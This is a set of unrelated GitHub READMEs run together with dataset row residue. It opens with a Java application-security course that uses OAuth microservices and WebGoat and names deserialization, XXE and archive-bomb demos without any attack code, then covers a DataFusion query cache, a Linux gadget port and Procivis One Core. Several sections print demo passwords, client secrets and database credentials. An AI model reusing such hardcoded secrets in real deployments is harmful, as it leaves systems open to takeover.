- [Security Concepts](#security-concepts)
- [Project Modules](#project-modules)
- [Architectural Diagrams](#architectural-diagrams)
  - [Software Architecture Diagram](#software-architecture-diagram)
  - [Sequence Diagram](#sequence-diagram) 
- [Technology Stack](#technology-stack)
- [SetUp](#setup)
- [Security Checks](#security-checks)
  - [OWASP Dependency-Check](#owasp-dependency-check)
  - [SpotBugs with FindSecBugs Plugin](#spotbugs-with-findsecbugs-plugin)
  - [Zed Attack Proxy (ZAP)](#zed-attack-proxy-zap)
- [License](#license)

## Security Concepts

Among the **security concepts** demonstrated in this project:

- Security Design Principles
  - Least privilege
  - Defense in depth
  - Fail securely
  - Compartmentalization
- OAuth 2.0 Grant Types:
  - Password Flow
  - Client Credentials Flow
  - Authorization Code Flow
  - Authorization Code Flow with Proof Key for Code Exchange (PKCE)
- API and Microservices Security
  - Token introspection
  - JSON Web Key Set (JWKS)
  - Roles-based access control
- Java Process Security
  - Input data validation and sanitization
  - Handling input files from external sources
  - Security logging best practices
  - Content Security Policy (CSP)
  - Cross-Origin Resource Sharing (CORS)
  - HTTP security headers (e.g., Strict-Transport-Security, X-XSS-Protection, X-Frame-Options)
  - Java deserialization
- Security Testing
  - Software Composition Analysis (SCA)
  - Static Application Security Testing (SAST)
  - Dynamic Application Security Testing (DAST)

## Project Modules

Below is a breakdown and description of each module in the current project.

Module                                                  | Description                                                                                                                                                                                                                                                                                                                                   |
------------------------------------------------------- |-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
`pizza-order-*`, `pizza-cooking-*`, `pizza-delivery-*`  | These modules represent 3 microservices and their APIs (Pizza Cooking, Delivery, and Order) that demonstrate various OAuth 2.0 flows (e.g., token introspection, JWKS, client credentials), roles-based access control and security logging concepts.                                                                                         |
`security-feign-logger-enricher`                        | Enriches and enables standard Feign client logging with additional custom Mapped Diagnostic Context (MDC) attributes (e.g., correlation ID) using SLF4J's MDC.                                                                                                                                                                                |
`security-slf4j-logger-enricher`                        | Enriches SLF4J-based logging with security-specific attributes (e.g., remote host, remote port, user agent, request URI, request method, correlation ID) using SLF4J's MDC.                                                                                                                                                                   |
`security-token-client-credentials-fetcher`             | Fetches tokens from the Identity Provider (IdP) using the client credentials flow.                                                                                                                                                                                                                                                            |
`security-token-introspection`                          | Introspects and validates access tokens using the IdP's token introspection endpoint. Additionally, it disables security for specific `/public` endpoints (e.g., OpenAPI definition endpoint), configures CORS and Content Security Policy (CSP), adds HTTP security headers, and parses JWT claim roles, adding them as granted authorities. |
`security-token-jwks`                                   | Handles JSON Web Key Set (JWKS) validation and signature verification of JWT tokens using the IdP's JWKS endpoint. Additionally, it disables security for specific `/public` endpoints (e.g., OpenAPI definition endpoint) and parses JWT claim roles, adding them as granted authorities.                                                    |
`serialization-deserialization`                         | Demonstrates security risks in serialization and deserialization, including exploits like Java class deserialization attacks, XML external entities, YAML bombs, and ZIP bombs.                                                                                                                                                               |

## Architectural Diagrams

### Software Architecture Diagram

This software architecture diagram illustrates the microservices as components within the system and highlights key security aspects, including OAuth 2.0 flows (e.g., Token introspection, JWKS) and endpoint roles checks.

<img src=""assets/diagrams/software-architecture-diagram.svg"">

### Sequence Diagram

```mermaid
sequenceDiagram
actor User
User->>IdP: Authenticate and fetch JWT (authorization code flow)
User->>Pizza Order Service: Submit order with JWT as HTTP Bearer token
Pizza Order Service->>IdP: Introspect JWT to verify validity
Pizza Order Service->>Pizza Order Service: Check user roles/permissions
Pizza Order Service->>Pizza Cooking Service: Submit cooking order with JWT as HTTP Bearer token
Pizza Cooking Service->>IdP: Fetch JWKS keys (if missing or expired) for local JWT validation
Pizza Cooking Service->>Pizza Cooking Service: Validate JWT signature using JWKS
Pizza Cooking Service->>Pizza Cooking Service: Check user roles/permissions

Note right of Pizza Cooking Service: Pizza is cooked ...

Pizza Cooking Service->>IdP: Fetch JWT (client credentials flow)
Pizza Cooking Service->>Pizza Delivery Service: Submit delivery order with JWT as HTTP Bearer token
Pizza Delivery Service->>IdP: Fetch JWKS keys (if missing or expired) for local JWT validation
Pizza Delivery Service->>Pizza Delivery Service: Validate JWT signature using JWKS
Pizza Delivery Service->>Pizza Delivery Service: Check user roles/permissions
Pizza Delivery Service->>Pizza Delivery Service: Confirm order delivered
Pizza Delivery Service->>Pizza Order Service: Send order status update
Pizza Order Service->>IdP: Introspect JWT to verify validity
Pizza Order Service->>Pizza Order Service: Check user roles/permissions
Pizza Order Service->>Pizza Order Service: Update order status
```

## Technology Stack

This project includes the following **technologies, frameworks, and libraries**:

- [Spring Boot](https://spring.io/projects/spring-boot)
- [Spotless](https://github.com/diffplug/spotless) as a code formatter
- [Docker compose](https://docs.docker.com/compose/)
- [Keycloak](https://www.keycloak.org/) as an Identity and Access Management solution
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check) as a Software Composition Analysis (SCA) tool
- [Spotbugs](https://spotbugs.github.io/) with [FindSecBugs plugin](https://find-sec-bugs.github.io/) as a Static Application Security Testing (SAST) tool
- [The Zed Attack Proxy (ZAP)](https://github.com/zaproxy/zaproxy) as a Dynamic Application Security Testing (DAST) tool
- [OWASP WebGoat](https://owasp.org/www-project-webgoat) a deliberately insecure application

## SetUp

### Tools to Download and Install

Please ensure you have properly downloaded, installed, and configured the following tools:

Tool                         | Link                                                                                              |
---------------------------- |---------------------------------------------------------------------------------------------------|
JDK 21                       | [Download](https://projects.eclipse.org/projects/adoptium.temurin/downloads) _(i.e., latest LTS)_ |
Docker                       | [Download](https://docs.docker.com/engine/install/)                                               |
Postman                      | [Download](https://www.postman.com/)                                                              |
`curl` command line          | [Download](https://everything.curl.dev/install/index.html)                                        |
`jq` command line            | [Download](https://jqlang.github.io/jq/download/)                                                 |


The course is developed to work best on **GNU/Linux**. However, if you prefer to use a **Windows** machine, you can use one of the following alternatives to properly execute the bash scripts: 
- [GIT bash](https://git-scm.com/downloads)
- [Cygwin](https://www.cygwin.com/)
- Windows Subsystem for Linux (WSL)
 
### Compile, Run Tests, and Package

To compile the project, run tests, and package it, use the following command:

```bash
./mvnw clean package
```

### Bootstrap Services with Docker

**Note:** Please ensure that the Docker daemon is running; otherwise, the commands will not execute successfully.

1. Run the following command to start the `Keycloak` service in Docker:

    ```bash
    ./bootstrap-keycloak.sh
    ```

2. To start the `Pizza` application, which includes multiple microservices running in Docker, execute:
   
    ```bash
    ./bootstrap-pizza-application.sh
    ```

3. Next, run the following command to start the `OWASP WebGoat` application in Docker:
   
    ```bash
    ./bootstrap-webgoat.sh
    ```

4. Finally, check that all Docker containers are up and running by executing:

    ```bash
    docker ps -a
    ```

### Keycloak Configuration

To set up a basic Keycloak configuration, run the following script:

```bash
./keycloak-init.sh
```

The script creates OAuth 2.0 clients, users, and roles under the `master` realm and assigns the roles to the users:

 Type         | Name                  | Password                           | Purpose                                     |
--------------|-----------------------|------------------------------------|---------------------------------------------|
 User         | `demo_user`           | `Test1234!`                        | Used for authorization code flow with PKCE. |
 Client ID    | `demo_public_client`  | `6EuUNXQzFmxu6xwPHDvvoh56z1uzrBMw` | Used for authorization code flow.           |
 Client ID    | `demo_private_client` | `6EuUNXQzFmxu6xwPHDvvoh56z1uzrBMw` | Used for client credentials flow.           |

This setup utilizes [Keycloak's REST API](https://www.keycloak.org/docs-api/latest/rest-api/index.html) to perform these operations and provides output at each step, ensuring efficient user and client management within the Keycloak environment.

### Services Overview via UI

Open a browser and navigate to http://localhost:9090 to access the **Keycloak UI** (using the credentials `admin:admin`).

Open a browser and navigate to http://localhost:9090/realms/master/.well-known/openid-configuration to access the **Keycloak OpenID Connect configuration**.

Open a browser and navigate to http://localhost:18080/public/swagger-ui/index.html to access the **Pizza Order OpenAPI definition**.

Open a browser and navigate to http://localhost:28080/public/swagger-ui/index.html to access the **Pizza Cooking OpenAPI definition**.

Open a browser and navigate to http://localhost:38080/public/swagger-ui/index.html to access the **Pizza Delivery OpenAPI definition**.

Open a browser and navigate to http://localhost:48080/WebGoat/login to access the **OWASP WebGoat UI**.

### Local Tests with Postman

1. Open `Postman` and import the [Postman collections](postman).
2. To simulate a basic test scenario, follow these steps in the given sequence:
  - a) Fetch the JWT token using either:
    - The **Password Flow**:
       ```
       POST http://localhost:9090/realms/master/protocol/openid-connect/token
       ```
    - Or the **Client Credentials Flow**:
       ```
       POST http://localhost:9090/realms/master/protocol/openid-connect/token
       ```      
    - Or the **Authorization Code Flow with PKCE**:
       ```
       POST http://localhost:9090/realms/master/protocol/openid-connect/auth
       ```   
  - b) Initiate an order request to the `pizza-order-service`:
       ```
       POST http://localhost:18080/pizza/orders
       ```

## Security Checks

### OWASP Dependency-Check

[OWASP Dependency-Check](https://owasp.org/www-project-dependency-check) is an open-source **Software Composition Analysis (SCA)** tool that identifies vulnerabilities in project dependencies, helping reveal and address known security risks.

To check for potential dependency vulnerabilities, execute the following command:

```bash
./mvnw clean compile org.owasp:dependency-check-maven:check
```

**Note:** The first run of this command might take a significant amount of time (e.g., from a couple of minutes to even tens of minutes, depending on the internet connection) to initially download the [NVD Data Feeds](https://nvd.nist.gov/vuln/data-feeds) hosted by NIST. 

### SpotBugs with FindSecBugs Plugin

[Spotbugs](https://spotbugs.github.io/) is an open-source static analysis tool that detects bugs in Java programs by analyzing bytecode.

With the help of the [FindSecBugs plugin](https://find-sec-bugs.github.io/) plugin, it can be used as a **Static Application Security Testing (SAST)** tool to identify security vulnerabilities in Java applications.

To check for potential code vulnerabilities, execute the following command:

```bash
./mvnw clean compile spotbugs:check
```

### Zed Attack Proxy (ZAP)

[The Zed Attack Proxy (ZAP)](https://github.com/zaproxy/zaproxy) is an open-source **Dynamic Application Security Testing (DAST)** tool specifically designed for identifying vulnerabilities in applications during runtime.

To check for API security vulnerabilities, execute the following command:

```bash
./zap-scan.sh
```

The command starts ZAP in Docker, launches an API scan using the [zap-api-scan rules](zap/zap-api-scan-rules.conf) against one of the services, and saves the scan report in the [./zap/reports](zap/reports) folder.

## License

This project is licensed under the Apache License, Version 2.0.

Please see the [LICENSE](license/LICENSE) file for full license.

```
/*
 * Application Security for Java Developers
 *
 * Copyright (C) 2024 Ionut Balosin
 * Website: www.ionutbalosin.com
 * X: @ionutbalosin | LinkedIn: ionutbalosin | Mastodon: ionutbalosin@mastodon.social
 *
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * ""License""); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
```",0,0,2,,,0.0
datafusion-contrib/datafusion-query-cache,main,"# Datafusion Query Cache

**WIP this project is very early.**

See [apache/datafusion#12779](https://github.com/apache/datafusion/issues/12779) for discussion.

Cache the intermediate results of queries on timeseries data in DataFusion.

## How it works (the very quick version)

Let's say you run the query:

```sql
SELECT max(price) FROM stock_prices WHERE symbol = 'AAPL' and timestamp > '2000-01-01'
```

Then 10 minutes later you run the same query ‚Äî by default DataFusion will process every one of the millions of record in the `stock_prices` table again to calculate the result, even though only the last 10 minutes of data has changed.

Obvious we could save a lot of time and compute if we could remember the result of the first query, then combining it with a query on the last 10 minutes of data to get a result.

**That's what `datafusion-query-cache` does!**

The key is that often in timeseries data, new data is inserted with a `timestamp` column that is close to `now()`, so it's trivial to know what results we can cache and what results we must recompute.

`datafusion-query-cache` doesn't have opinions about where the cached data is stored, instead you need to implement the `QueryCache` trait to store data. A very simple `MemoryQueryCache` is provided for testing, we should add `ObjectStoreQueryCache` too.

## How it works (the longer version)

Some people reading the above example will already being asking

> But combining max values is easy (you just take the max of the maxes), what about more complex queries?
> If we had used `avg` instead of `max` you can't combine two averages by just averaging them.

The best bit is: DataFusion already has all the machinery to combine partial query results, so `datafusion-query-cache` doesn't need any special logic for different aggregations, indeed it doesn't even know what they are.

Instead we just hook into the right place in the physical plan to provide the cached results, constrain the query on new data and store the new result.

### Let's look at an example

The physical plan for

```sql
SELECT avg(price) FROM stock_prices WHERE symbol = 'AAPL' and timestamp > '2000-01-01'
```

looks something like this (lots of details omitted):

```rs
AggegateExec {
    mode: Final,
    aggr_expr: [Avg(price)],
    input: AggegateExec {
        mode: Parital,
        aggr_expr: [Avg(price)],
        input: FilterExec {
            predicate: (symbol = 'AAPL' and timestamp > '2000-01-01'),
            input: TableScanExec {
                table: stock_prices
            }
        }
    }
}
```

Notice how the `input` for the top level `AggegateExec` is another `AggegateExec`? That's DataFusion allowing parallel execution by splitting the data into chunks and aggregating them separately. The output of the inner `AggegateExec` (note `mode: Parital`) will look something like:

| `avg(price)[count]` | `avg(price)[sum]` |
|---------------------|-------------------|
| 123.4               | 1000              |
| 125.4               | 1000              |
| 127.4               | 1000              |
| ...                 | ...               |

The top level `AggegateExec` with (`mode: Final`), then combines these partial results to get the final answer.

This ""combine partial results"" is exactly what `datafusion-query-cache` uses to combine the cached result with the new data.

So `datafusion-query-cache`, would rewrite the above query to have the following physical plan:

```rs
AggegateExec {
    mode: Final,
    aggr_expr: [Avg(price)],
    input: CacheUpdateAggregateExec {  // wrap the partial aggegations and stores the result for later
        input: UnionExec {
            inputs: [
                AggegateExec {  // compute aggegates for the new data
                    mode: Parital,
                    aggr_expr: [Avg(price)],
                    input: FilterExec {
                        predicate: ((symbol = 'AAPL' and timestamp > '2000-01-01') and timestamp < '{last run}'),
                        input: TableScanExec {
                            table: stock_prices
                        }
                    }
                },
                CachedAggregateExec {  // get the cached result
                    cache_key: ""SELECT avg(price)..."",
                }
            ]
        }
    }
}
```

The beauty is, if we wrote a more complex query, say:

```sql
SELECT
    date_trunc('hour', timestamp) AS time_bucket,
    round(avg(value), 2) as avg_value,
    round(min(value), 2) as min_value,
    round(max(value), 2) as max_value
FROM stock_prices
WHERE symbol = 'AAPL' AND timestamp > '2000-01-01'
GROUP BY time_bucket
ORDER BY time_bucket DESC
```

`datafusion-query-cache` doesn't need to be any cleverer, DataFusion does the hard work of combining the partial results, even accounting for the different buckets and aggregations and combining them correctly.

## Prior art

Other database have similar concepts, e.g. [continuous aggregates](https://docs.timescale.com/use-timescale/latest/continuous-aggregates/) in TimeScaleDB, but they require explicit setup. In contrast, `datafusion-query-cache` analyses queries (including subqueries) and automatically applies the cache if it can.

## What's supported

* [x] `GROUP BY` aggregation queries with a static lower bound (or no lower bound)
* [x] Aggregation queries (no `GROUP BY`) with a static lower bound (or no lower bound)
* [ ] Simple filter queries ‚Äî this should be simple enough
* [ ] `GROUP BY` aggregation queries with a dynamic lower bound (e.g . `timestamp > now() - interval '1 day'`) - this requires a `FilterExec` wrapping the `UnionExec` and discarding older data
* [ ] Aggregation queries (no `GROUP BY`) with a dynamic lower bound - this is harder, we probably have to rewrite the aggregation to include a `group_by` clause, then filter, then aggregate again???

## How to use

`datafusion-query-cache` implements [`QueryPlanner`](https://docs.rs/datafusion/latest/datafusion/execution/context/trait.QueryPlanner.html), [`OptimizerRule`](https://docs.rs/datafusion/latest/datafusion/optimizer/trait.OptimizerRule.html), [`UserDefinedLogicalNodeCore`](https://docs.rs/datafusion/latest/datafusion/logical_expr/trait.UserDefinedLogicalNodeCore.html) and [`ExecutionPlan`](https://docs.rs/datafusion/latest/datafusion/physical_plan/trait.ExecutionPlan.html) to customise query execution.

Usage is as simple as calling `with_query_cache` on a `SessionStateBuilder`, here's a complete (if minimal) example of creating a `SessionContext`:

```rs
async fn session_ctx() -> SessionContext {
    let state_builder = SessionStateBuilder::new()
        .with_config(SessionConfig::new())
        .with_runtime_env(Arc::new(RuntimeEnv::default()))
        .with_default_features();

    // records.timetamp is the default (and only) temporal column to look at
    let temporal_col = Column::new(Some(""records"".to_string()), ""timestamp"".to_string());

    // create an in memory cache for the query results
    // (in reality, you'd want to impl the `QueryCache` trait and store the data somewhere persistent)
    let cache = Arc::new(datafusion_query_cache::MemoryQueryCache::default());

    // create the query cache config
    let query_cache_config = datafusion_query_cache::QueryCacheConfig::new(temporal_col, cache)
        .with_group_by_function(""date_trunc"");

    // call with_query_cache to register the planners and optimizers
    let state_builder = datafusion_query_cache::with_query_cache(state_builder, query_cache_config);
    SessionContext::new_with_state(state_builder.build())
}
```

See [`examples/demo.rs`](./examples/demo.rs) for a more complete working example.
",0,0,1,Apache-2.0,,0.0
polyfloyd/gadgets-for-linux,main,"Gadgets for Linux
=================

Software preservation effort for fun to make the original .gadget files from Windows Vista and
Windows 7 work on Linux.

Gadgets are a collection of web resources, hence this project uses WebKit embedded in GTK along
with a bunch of polyfills to mimic the Microsoft API's.

![Screenshot](screenshot.png)

Verified working gadgets:
* MS Clock
* MS CPU Gauge
* AddGadgets All CPU Meter v1.3 (graph still missing)

The gadget files are still subject to copyright as far as I am aware, so I am hesitant to include
them here. However, they can be downloaded from
[archive.org](http://web.archive.org/web/20111221105443/http://windows.microsoft.com/en-US/windows/downloads/personalize/gadgets)
and [here](https://lelegofrog.github.io/wingadgets7.html)
",0,0,1,MIT,,0.0
Hirun4/music-app,main,"## Getting Started

Welcome to the VS Code Java world. Here is a guideline to help you get started to write Java code in Visual Studio Code.

## Folder Structure

The workspace contains two folders by default, where:

- `src`: the folder to maintain sources
- `lib`: the folder to maintain dependencies

Meanwhile, the compiled output files will be generated in the `bin` folder by default.

> If you want to customize the folder structure, open `.vscode/settings.json` and update the related settings there.

## Dependency Management

The `JAVA PROJECTS` view allows you to manage your dependencies. More details can be found [here](https://github.com/microsoft/vscode-java-dependency#manage-dependencies).
",0,0,1,,,0.0
procivis/one-core,main,"![Procivis](docs/assets/logo_dark_One_Core.png#gh-light-mode-only)
![Procivis](docs/assets/logo_light_One_Core.png#gh-dark-mode-only)

<!-- TOC ignore:true -->
## Table of Contents
<!-- TOC -->

- [Getting started](#getting-started)
- [Background](#background)
- [eIDAS 2.0](#eidas-20)
- [Interoperability and conformance](#interoperability-and-conformance)
- [Supported standards](#supported-standards)
- [Support](#support)
- [License](#license)

<!-- /TOC -->

The *Procivis One Core* is a robust solution capable of powering every element of the
digital identity credential lifecycle, flexibly handling a broad array of different
protocols and trust models, ensuring compatibility with different digital identity
regulations, and can be installed and operated almost anywhere, ensuring seamless
integration through a powerful API.

*Procivis One* is built to connect your organization to the SSI ecosystem, become
compatible with regulations such as [**eIDAS 2.0**](#eidas-20), and be extensible as
new regulations and requirements emerge.

See the [key features][key] and complete solution [architecture][archi].

## Getting started

### Trial

The fastest way to get started with Procivis One is to [join our Trial Environment][trial].
Here you are given control of an organization on our server solution, the Procivis
One Desk, and can quickly begin issuing and verifying credentials.

### Documentation

See our documentation:

- [API Docs home][apidocs]
- [Core API Reference][apiref]
- [Core SDK Reference][sdkref]
- [Docs home][docs]

### Build

You can build the project with cargo build as well as build certain target using cargo-make.
Cargo-make will include dev.env file in the runtime. This makes env config convenient
and create an opportunity to document used variables in one place.

Install cargo-make

```shell
cargo install cargo-make
```

Build REST server

```shell
makers build
```

Run REST server

```shell
makers run
```

We can use `Makefile.toml` to add and fine tune build/run targets later in the project.

### Tests

To run only the unit tests

```shell
cargo test --lib
# or
makers unit-tests
```

To run integration-tests

```shell
cargo test --test integration_tests
# or
makers integration-tests
```

To run integration-tests with MariaDB

```shell
makers dbstart
ONE_app__databaseUrl=""mysql://root:Qpq5nDb5MKD6v9bt8dPD@localhost/core"" makers integration-tests
```

### Run Wallet

You can start a separate instance of a service that will play wallet role. This instance is accessible on port 3001.

```shell
makers runwallet
```

### Live Reload

Using `cargo-watch`, the code can be automatically recompiled when changes are made.

Setup

```shell
cargo install cargo-watch
```

Run the REST server

```shell
makers runw
```

Run compiled application (Local env)

```shell
./target/debug/core-server --config config/config-procivis-base.yml --config config/config-local.yml
```

### Docker

- Run MariaDB for local developing

```shell
docker compose -f docker/db.yml up -d
or
makers dbstart
```

- Stop MariaDB for local developing

```shell
docker compose -f docker/db.yml down
or
makers dbstop
```

- Drop MariaDB for local developing - removes everything

```shell
makers dbdrop
```

- Print MariaDB logs

```shell
docker compose -f docker/db.yml logs -f
```

- Build project

```shell
docker build -t one-core -f docker/Dockerfile .
```

- Run project on Windows or Mac

```shell
docker run --init -p 3000:3000 -it --rm \
  -e RUST_BACKTRACE=full \
  -e ONE_app__databaseUrl=mysql://core:886eOqVMmlHsayu6Vyxw@host.docker.internal/core \
  one-core --config config/config-procivis-base.yml --config config/config-local.yml
```

- Run project on Linux

```shell
docker run --init -p 3000:3000 -it --rm \
  -e RUST_BACKTRACE=full \
  -e ONE_app__databaseUrl=mysql://core:886eOqVMmlHsayu6Vyxw@172.17.0.1/core \
  one-core --config config/config-procivis-base.yml --config config/config-local.yml
```

- Run shell in the container

```shell
docker run -it --rm --entrypoint="""" one-core bash
```

### SBOM

Source:

- [https://github.com/CycloneDX/cyclonedx-rust-cargo](https://github.com/CycloneDX/cyclonedx-rust-cargo)
- [https://github.com/CycloneDX/cyclonedx-cli](https://github.com/CycloneDX/cyclonedx-cli)

- Install cyclonedx-cli

```shell
sudo curl -L https://github.com/CycloneDX/cyclonedx-cli/releases/download/v0.25.0/cyclonedx-linux-x64 -o /usr/local/bin/cyclonedx-cli
sudo chmod +x /usr/local/bin/cyclonedx-cli
```

- Install cyclonedx

```shell
cargo install cargo-cyclonedx
```

- Generate JSON format

```shell
cargo cyclonedx -f json
```

- Prepare env

```shell
export DEPENDENCY_TRACK_BASE_URL=https://dtrack.dev.one-trust-solution.com
export DEPENDENCY_TRACK_API_KEY=""<api_key>""
export DEPENDENCY_TRACK_PROJECT_NAME=""ONE-Core""

export D_TRACK_PATH=${DEPENDENCY_TRACK_BASE_URL}/api/v1/bom
export SBOM_FILE_PATH=""apps/core-server/bom.json""
export APP_VERSION=""local-test-1""
```

- Upload JSON BOM file

```shell
file_content=$(base64 -i merged_sbom.json)

curl -v -X PUT \
  -H ""Content-Type: application/json"" \
  -H ""X-API-Key: ${DEPENDENCY_TRACK_API_KEY}"" \
  --data @- ${D_TRACK_PATH} <<EOF
{
  ""projectName"": ""${DEPENDENCY_TRACK_PROJECT_NAME}"",
  ""projectVersion"": ""${APP_VERSION}"",
  ""autoCreate"": true,
  ""bom"": ""${file_content}""
}
EOF
```

- Merge all SBOM files to one

```shell
FILES=""apps/core-server/bom.json apps/migration/bom.json lib/one-core/bom.json lib/shared-types/bom.json lib/sql-data-provider/bom.json platforms/uniffi/bom.json platforms/uniffi-bindgen/bom.json""
cyclonedx-cli merge --input-files ${FILES} --input-format=json --output-format=json > merged_sbom.json
```

#### Testing

##### Run tests

```shell
cargo llvm-cov --no-clean --workspace --release --ignore-filename-regex="".*test.*\.rs$|tests/.*\.rs$""
```

##### Generate report

- Cobertura

```shell
cargo llvm-cov report --release --cobertura --output-path cobertura.xml
```

- Lcov

```shell
cargo llvm-cov report --release --lcov --output-path lcov.info
```

## Background

Decentralized digital identities and credentials is an approach to identity that relocates
digital credentials from the possession and control of centralized authorities to the
digital wallet of the credentials holder. This architecture eliminates the need for the
user to ""phone home"" to use their credentials as well as the verifier to communicate to
the issuer via back-channels, keeping the wallet holder's interactions private between only
those parties directly involved in each interaction. This model of digital identity is
often referred to as Self-Sovereign Identity, or SSI.

## eIDAS 2.0

Whether you want to:

- issue into an EUDI Wallet
- provide an EUDI Wallet
- offer services to an EUDI Wallet holder

*Procivis One* provides production grade open source components to get certified and
connect your organization to the eIDAS 2.0 ecosystem.

![Procivis One in the eIDAS ARF](docs/assets/eIDAS_Architecture.png)

Use the *Procivis One Core* for Issuer or Verifier solutions. For an EUDI Wallet, use the
[One Core React Native SDK][rncore] for embedding into an existing app, or use the
[Procivis One Wallet][pow] with adaptations to fit your needs.

## Interoperability and conformance

*Procivis One* is built using [open standards](#supported-standards) and tested to ensure
interoperability with different software vendors and across different international
regulatory ecosystems.

- W3C standards
  - The W3C offers several test suites for standards conformance. See
    the latest test results for Procivis One at [canivc.com][canivc].
- ISO/IEC 18013-5 mDL
  - *Procivis One*'s implementation of the ISO mDL standard is compatible with the
    OpenWallet Foundation's verifier: *Procivis One* can successfully issue mDL
    credentials to a *Procivis One Wallet*, and these credentials can successfully
    be verified by the OpenWallet Foundation's verifier. See the [OpenWallet Foundation libraries][owf].
- eIDAS 2.0; EUDI Wallet
  - The EU Digital Wallet is developing [issuer][eudiwi] and [verifier][eudiwv] testing for
    interoperability in mdoc and SD-JWT formats using OID4VC protocols. We follow the ongoing
    development of the testing platform and regularly test against it.

We continue to look for more opportunities for interoperability testing as the standards
and regulations mature and harden.

## Supported standards

### Credential data models

#### Verifiable Credentials

- [W3C Verifiable Credentials Data Model 2.0][vcdm] in the following variations:

| Securing mechanism                           | Supported representations                           | Supported proof/signature types                                                          |
| -------------------------------------------- | ----------------------------------------- | ------------------------------------------------------------------------------ |
| [W3C Data Integrity Proofs][vcdi] (embedded) | [JSON-LD][jld] in Compacted Document Form | <ul><li>[W3C Data Integrity ECDSA Cryptosuites v1.0][ecd] / [ecdsa-rdfc-2019][ecd2019]</li><li>[W3C Data Integrity EdDSA Cryptosuites v1.0][edd] / [eddsa-rdfc-2022][edd2022]</li><li>[W3C Data Integrity BBS Cryptosuites v1.0][bbs] / [bbs-2023][bbs2023]</li></ul> |
| [W3C VC-JOSE-COSE][jose] (enveloping)        | <ul><li>[SD-JWT][sdjwt]</li><li>[JWT][jw]</li></ul> | <ul><li>JOSE / ECDSA [ES256][es2]</li><li>JOSE / EdDSA [Ed25519][ed255]</li><li>JOSE / CRYSTALS-DILITHIUM 3 [CRYDI3][crydi3]* |

\* CRYSTALS-DILITHIUM is a post-quantum resistant signature scheme, selected by NIST for [Post-Quantum Cryptography Standardization][pqc].
Support for the recently published [FIPS-204][fips] is planned for the near future.

- **Backwards compatibility**: Procivis One supports verification of proofs which use VCDM 1.1.

- **Additional VC formats**: Procivis One supports verification of VCs embedded in optical barcodes.
See [Verifiable Credentials Barcode v0.7][vcbarcode].

#### ISO mdocs

- [ISO/IEC 18013-5:2021][iso] standard for mdoc credentials.
  - [COSE][cose] proofs
    - ECDSA [ES256][es2]
    - EdDSA [Ed25519][ed255]

### Exchange and transport

- OpenID for Verifiable Credentials
  - [OID4VCI][vci]; ID-1
  - [OID4VP][vp]; ID-2
    - [OID4VP over BLE][ble]; optimized version of Draft 00
    - OID4VP over MQTT; proprietary adaptation of OID4VP over BLE via MQTT channel
- [ISO/IEC 18013-5][iso]
  - QR code engagement and offline device retrieval over BLE

### Key storage

- Secure Enclave (iOS) and Android Keystore (TEE or Strongbox)
- Azure Key Vault (HSM)
- Internal encrypted database

### Revocation methods

- [Bitstring Status List v1.0][sl]
- [Linked Validity Verifiable Credentials (LVVC)][lvvc]

### DID methods

- [Decentralized Identifiers (DIDs) v1.0][did]
  - [did:key][dk]
  - [did:web][dw]
  - [did:jwk][djw]
- [Universal DID resolution][univ]

See our [supported technology][supptech] page for more details.

## Support

Need support or have feedback? [Contact us](https://www.procivis.ch/en/contact).

## License

Some rights reserved. This library is published under the [Apache License
Version 2.0](./LICENSE).

![Procivis AG](docs/assets/logo_light_mode_Procivis.svg#gh-light-mode-only)
![Procivis AG](docs/assets/logo_dark_mode_Procivis.svg#gh-dark-mode-only)

¬© Procivis AG, [https://www.procivis.ch](https://www.procivis.ch).

[apidocs]: https://docs.procivis.ch/guides/api/overview
[apiref]: https://docs.procivis.ch/docs/core-api
[archi]: https://github.com/procivis#architecture
[bbs]: https://www.w3.org/TR/vc-di-bbs/
[bbs2023]: https://www.w3.org/TR/vc-di-bbs/#bbs-2023
[ble]: https://openid.net/specs/openid-4-verifiable-presentations-over-ble-1_0.html
[canivc]: https://canivc.com/implementations/procivis-one-core/
[cose]: https://www.rfc-editor.org/rfc/rfc9052
[crydi3]: https://datatracker.ietf.org/doc/html/draft-ietf-cose-dilithium-01
[did]: https://www.w3.org/TR/did-core/
[djw]: https://github.com/quartzjer/did-jwk/blob/main/spec.md
[dk]: https://w3c-ccg.github.io/did-method-key/
[docs]: https://docs.procivis.ch/
[dw]: https://w3c-ccg.github.io/did-method-web/
[ecd]: https://www.w3.org/TR/vc-di-ecdsa/
[ecd2019]: https://www.w3.org/TR/vc-di-ecdsa/#ecdsa-rdfc-2019
[edd]: https://www.w3.org/TR/vc-di-eddsa/
[edd2022]: https://www.w3.org/TR/vc-di-eddsa/#eddsa-rdfc-2022
[ed255]: https://datatracker.ietf.org/doc/html/rfc8037
[es2]: https://datatracker.ietf.org/doc/html/rfc7518
[eudiwi]: https://issuer.eudiw.dev/
[eudiwv]: https://verifier.eudiw.dev/home
[fips]: https://csrc.nist.gov/pubs/fips/204/final
[iso]: https://www.iso.org/standard/69084.html
[jld]: https://www.w3.org/TR/json-ld11/
[jose]: https://w3c.github.io/vc-jose-cose/
[jw]: https://datatracker.ietf.org/doc/html/rfc7519
[key]: https://github.com/procivis#key-features
[lvvc]: https://eprint.iacr.org/2022/1658.pdf
[owf]: https://github.com/openwallet-foundation-labs/identity-credential
[pow]: https://github.com/procivis/one-wallet
[pqc]: https://csrc.nist.gov/pqc-standardization
[rncore]: https://github.com/procivis/react-native-one-core
[sdjwt]: https://www.ietf.org/archive/id/draft-terbu-oauth-sd-jwt-vc-00.html
[sdkref]: https://docs.procivis.ch/sdk/overview
[sl]: https://www.w3.org/TR/vc-bitstring-status-list/
[supptech]: https://docs.procivis.ch/product/supported_tech
[trial]: https://docs.procivis.ch/trial/intro
[univ]: https://dev.uniresolver.io
[vcbarcode]: https://w3c-ccg.github.io/vc-barcodes/
[vcdi]: https://www.w3.org/TR/vc-data-integrity/
